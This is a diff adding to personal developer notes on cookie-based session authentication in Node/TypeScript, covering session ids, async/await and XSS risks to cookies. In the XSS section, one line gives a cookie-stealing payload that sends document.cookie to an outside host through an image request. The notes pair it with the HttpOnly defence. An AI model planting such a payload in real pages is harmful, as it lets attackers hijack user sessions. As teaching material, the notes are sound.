@@ -127,7 +127,7 @@ console.log(hash);
 ### Using Session (Stateful way)
 #### TODOs:
 * Once user is created, identify request are coming from same user for authorization etc.
-* Solution: Use cookie backed session implementation to track logged in user.
+* Solution: Use cookie backed session implementation to track logged in user. Cookie is speaial header which browser send with every request to server.
     * Use crypto.randomBytes for generating session id that is hard to guess 
         * **Refactoring**: Node callback based API calls will lead to nesting of callbacks.
         * Use async / await feature of typescript ... async calls will be executed asynchronously but code will not have nesting. With asyc / await code reads like synchronous style code - easy read ... less boiler plate.
@@ -136,6 +136,15 @@ console.log(hash);
         * await is equivalent to .then() 
         * error can be handles by try/catch or using catch with async function call.
         * callback will have (err, result) ... format
+    * Issues with cookie:
+        * Cookies are kind of storage mechanism. Can store user preferences etc.
+        * XSS - Cross Site Scripting attack - Can be hijacked by malicious code and session can be hijacked.
+            * Attacker can impersonate user. 
+            * Image tag can load image from another server - attach session id to very small image ...
+            * Comments ... which are not sanitized of HTML tags
+            new Image().src="http://host.com/somepath=" + document.cookie; 
+            * Solution - Mark cookies HttpOnly. - Will not be accesible to javascript ... Browser anyway is handling it automatically
+
 
     * Create Session(sessionid, user, expriesAt/validUntil)
     * Create SessionStore - SessionID - Session
